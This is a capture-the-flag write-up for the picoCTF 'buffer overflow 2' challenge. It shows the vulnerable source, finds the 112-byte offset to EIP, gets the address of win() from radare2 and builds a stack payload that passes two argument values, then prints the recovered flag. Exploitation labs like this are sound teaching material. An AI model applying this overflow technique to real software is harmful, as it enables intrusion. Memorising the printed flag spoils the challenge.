#buffer overflow 2
Sweet it's time to control some arguments!
What's in the source?
```
#define BUFSIZE 100                                                                                                                                                                                              
#define FLAGSIZE 64                                                                                                                                                                                              
                                                                                                                                                                                                                 
void win(unsigned int arg1, unsigned int arg2) {                                                                                                                                                                 
  char buf[FLAGSIZE];                                                                                                                                                                                            
  FILE *f = fopen("flag.txt","r");                                                                                                                                                                               
  if (f == NULL) {                                                                                                                                                                                               
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");                                                                            
    exit(0);                                                                                                                                                                                                     
  }                                                                                                                                                                                                              
                                                                                                                                                                                                                 
  fgets(buf,FLAGSIZE,f);                                                                                                                                                                                         
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}
```
Looks like we need to call win and assign arg1=0xDEADBEEF and arg2=0xDEADC0DE let's fill that buffer up and find where eip is called
```
for i in range(26): 
   sys.stdout.write(chr(i+0x41)*8)
```
Looks like we are 112 bytes away from eip time to find where win is located
```
[0x080484d0]> ? sym.win
134514123 0x80485cb 01001102713 128.3M 804000:05cb 134514123 "\xcb\x85\x04\b" 0b000010000000010010000101
11001011 134514123.0 134514128.000000f 134514123.000000 0t100101010000200120
```
Awesome now there is 4 bytes of junk then lets add our args 0xDEADBEEF and 0xDEADCODE
we run our solution script and viola!
```
$ cat ~/out | ./vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXXﾭ??
               picoCTF{addr3ss3s_ar3_3asyada28e9b}Segmentation fault (core dumped)
```

Nice!
